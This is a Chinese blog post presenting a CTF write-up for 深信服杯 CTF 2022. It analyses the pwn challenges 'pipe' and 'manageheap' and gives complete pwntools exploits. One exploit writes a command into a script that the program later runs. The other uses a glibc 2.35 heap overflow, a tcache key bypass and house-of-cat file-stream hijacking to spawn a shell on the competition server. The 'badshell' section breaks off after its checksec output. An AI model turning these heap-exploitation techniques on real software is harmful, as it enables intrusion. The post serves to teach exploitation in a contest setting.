      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/15/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E6%9D%AFCTF2022/" class="post-title-link" itemprop="url">深信服杯CTF2022</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-11-15 18:31:48 / Modified: 18:33:14" itemprop="dateCreated datePublished" datetime="2022-11-15T18:31:48+08:00">2022-11-15</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>8.9k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>8 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="pipe"><a href="#pipe" class="headerlink" title="pipe"></a>pipe</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pipe: ELF <span class="number">64</span>-bit LSB pie executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=d5d6c196bf2c85c2c624a610ec541382acc30bb0, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">  close(fd);</span><br><span class="line">  system(<span class="string">&quot;./ctf.sh&quot;</span>);</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>往 <code>&quot;./ctf.sh&quot;</code> 中写 <code>cat flag</code> 就可以了</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>可以先把 <code>cat flag</code> 写入管道，然后把 <code>pipe_buffer</code> 中的数据写入 <code>&quot;./ctf.sh&quot;</code></p>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./pipe&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.27.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;172.16.159.33&#x27;</span>,<span class="string">&#x27;45715&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x16D7)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">i</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;cmd&gt;&gt;&gt;\n&quot;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_from_pipe</span>():</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_to_pipe</span>(<span class="params">size,data</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;read size&gt;\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;input&gt;&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_file</span>(<span class="params">path</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;**File path&gt;&quot;</span>,path)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_file</span>(<span class="params">path,size</span>):</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;**File path&gt;&quot;</span>,path)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;**size?&gt;&quot;</span>,size)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>():</span></span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">close</span>():</span></span><br><span class="line">    cmd(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;file path&gt;&quot;</span>,<span class="string">&quot;./ctf.sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;cat flag\n&quot;</span></span><br><span class="line">write_to_pipe(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">write()</span><br><span class="line">close()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="manageheap"><a href="#manageheap" class="headerlink" title="manageheap"></a>manageheap</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.35</span><span class="number">-0u</span>buntu3)</span> stable release version 2.35.\n</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">manageheap: ELF <span class="number">64</span>-bit LSB pie executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /home/yhellow/tools/glibc-all-in-one/libs/<span class="number">2.35</span><span class="number">-0u</span>buntu3_amd64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=b988b53575c5a8324331c1b492940f6098e71ace, stripped<span class="number">&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">num = LODWORD(chunk_list[index]-&gt;num);</span><br><span class="line"><span class="keyword">if</span> ( i &gt; num )</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;chunk_list[index]-&gt;chunk_data[<span class="number">8</span> * i], id) )</span><br><span class="line">&#123;</span><br><span class="line">  read(<span class="number">0</span>, &amp;chunk_list[index]-&gt;chunk_data[<span class="number">8</span> * i], <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;change done.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>当 <code>i==num</code> 时，有8字节的溢出</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>先利用8字节的溢出来修改 chunk-&gt;size，释放后获得 unsorted chunk，接下来执行一次申请操作，泄露出遗留在 chunk 中的 main_arena 和 tcache-&gt;next</p>
<p>然后打 tcache attack，把 <code>IO_list_all</code> 写入 tcachebin 中，这里有两个注意点：</p>
<ul>
<li>libc-2.34 及其以上版本会设置 key 值，利用如下公式就可以绕过：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">key = heap_base // <span class="number">0x1000</span></span><br><span class="line">target = IO_list_all^key</span><br></pre></td></tr></table></figure>
<ul>
<li>劫持目标 tcachebin 之前，需要先看看 tcache head-&gt;count 的值够不够申请到 <code>IO_list_all</code>（当对应 count 为“0”时，程序将不会申请该 tcachebin 上的 free chunk），比赛时就考虑漏了这个问题，导致 <code>IO_list_all</code> 申请不出来，浪费了很长的时间</li>
</ul>
<p>在高版本 libc 中，最终劫持控制流的手段就那么几种，比赛时我使用了 house of cat</p>
<p>接下来就是标准的 house of cat 了，IO 流可以如下代码进行触发：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !read(<span class="number">0</span>, chunk_list[i]-&gt;chunk_data, <span class="number">8</span> * LODWORD(chunk_list[i]-&gt;num)) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;something error!&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>当输入的 <code>chunk_list[i]-&gt;num</code> 为“0”时，<code>read</code> 就会执行失败</li>
<li>然后调用 <code>exit</code> 触发 house of cat</li>
</ul>
<p>由于本题目没有沙盒，我的第一反应是直接写 <code>one_gadget</code>，后来打远程时环境不对，只能用 <code>system(&quot;/bin/sh&quot;)</code></p>
<p>当时不知道怎么控制程序的参数，幸好 house of cat 触发后直接执行了 <code>system(&quot;aaaaaaaa&quot;)</code>，于是我把所有的 <code>&quot;aaaaaaaa&quot;</code> 替换为 <code>&quot;/bin/sh&quot;</code> 然后就 getshell 了</p>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./manageheap1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#elf = ELF(challenge)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"><span class="comment">#cmd += &quot;b *$rebase(0x1868)\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge,cmd)</span></span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;172.16.159.33&#x27;</span>,<span class="string">&#x27;58012&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">i</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your Choice: &quot;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">number,name,<span class="built_in">id</span></span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;please input your major&#x27;s number:&quot;</span>,<span class="built_in">str</span>(number))</span><br><span class="line">    p.sendafter(<span class="string">&quot;please input your name:&quot;</span>,name)</span><br><span class="line">    p.sendafter(<span class="string">&quot;&gt; \n&quot;</span>,<span class="built_in">id</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;input your idx:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;input your idx:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,<span class="built_in">id</span></span>):</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;input your idx:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;please input your id:&quot;</span>,<span class="built_in">id</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x7</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>*<span class="number">0x7</span>)</span><br><span class="line">add(<span class="number">0x7</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>*<span class="number">0x7</span>)</span><br><span class="line">add(<span class="number">0x7</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>*<span class="number">0x7</span>)</span><br><span class="line">add(<span class="number">0x7</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>*<span class="number">0x7</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>*<span class="number">0x7</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>*<span class="number">0x7</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>*<span class="number">0x7</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0x31</span>))</span><br><span class="line">p.send(p64(<span class="number">0x621</span>))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>,<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;aaaaaaaaaaaaaaaa&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr-<span class="number">0x3f0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Member: &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x21a10a</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">IO_list_all = libc_base + libc.sym[<span class="string">&quot;_IO_list_all&quot;</span>]</span><br><span class="line">_IO_wfile_jumps = libc_base + libc.sym[<span class="string">&quot;_IO_wfile_jumps&quot;</span>]</span><br><span class="line">libc_puts = libc_base + libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;IO_list_all &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(IO_list_all))</span><br><span class="line">success(<span class="string">&quot;_IO_wfile_jumps &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(_IO_wfile_jumps))</span><br><span class="line"></span><br><span class="line">main_arena1 = libc_base + <span class="number">0x219c0a</span></span><br><span class="line">main_arena2 = libc_base + <span class="number">0x219ce0</span></span><br><span class="line">success(<span class="string">&quot;main_arena1 &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(main_arena1))</span><br><span class="line">success(<span class="string">&quot;main_arena2 &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(main_arena2))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000002be51</span></span><br><span class="line">pop_rdx_rbx_ret = libc_base + <span class="number">0x0000000000090529</span></span><br><span class="line"></span><br><span class="line">key = heap_base // <span class="number">0x1000</span></span><br><span class="line">success(<span class="string">&quot;key &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line">success(<span class="string">&quot;IO_list_all^key &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(IO_list_all^key))</span><br><span class="line"></span><br><span class="line">one_gadgets = [<span class="number">0x50a37</span>,<span class="number">0xebcf1</span>,<span class="number">0xebcf5</span>,<span class="number">0xebcf8</span>]</span><br><span class="line">one_gadget = one_gadgets[<span class="number">0</span>] + libc_base</span><br><span class="line">libc_system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;one_gadget &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line">success(<span class="string">&quot;libc_system &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_system))</span><br><span class="line"></span><br><span class="line">target_chunk = heap_base + <span class="number">0x340</span></span><br><span class="line">target = target_chunk ^ key</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(target))</span><br><span class="line">p.sendline(p64(IO_list_all^key))</span><br><span class="line"></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_io_addr = heap_base + <span class="number">0x430</span> </span><br><span class="line">payload_addr = heap_base</span><br><span class="line">flag_addr = heap_base</span><br><span class="line"></span><br><span class="line">fake_IO_FILE =  <span class="string">&quot;/bin/sh\x00&quot;</span>         <span class="comment">#_flags=rdi</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)+p64(<span class="number">2</span>) <span class="comment"># rcx!=0(FSOP)</span></span><br><span class="line">fake_IO_FILE += p64(payload_addr-<span class="number">0xa0</span>)<span class="comment">#_IO_backup_base=rdx</span></span><br><span class="line">fake_IO_FILE += p64(libc_system)<span class="comment">#_IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(flag_addr)  <span class="comment"># _lock = a writable address</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x30</span>)<span class="comment">#_wide_data,rax1_addr</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0xb0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) <span class="comment">#mode=1</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0xc8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(_IO_wfile_jumps+<span class="number">0x30</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)  <span class="comment"># rax2_addr</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&quot;cccccccc&quot;</span>,fake_IO_FILE)</span><br><span class="line">add(<span class="number">6</span>,<span class="string">&quot;cccccccc&quot;</span>,<span class="string">&quot;cccccccc&quot;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="string">&quot;cccc&quot;</span>,p64(fake_io_addr))</span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;please input your major&#x27;s number:&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;please input your name:&quot;</span>,<span class="string">&quot;win&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>PS：菜鸡 pwn 手的第一个3血</p>
<h2 id="badshell"><a href="#badshell" class="headerlink" title="badshell"></a>badshell</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.9</span>)</span> stable release version 2.31.\n</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">badshell: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=<span class="number">7b</span>723a1405c35735c73c5600c68ee2c53b2a1f33, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
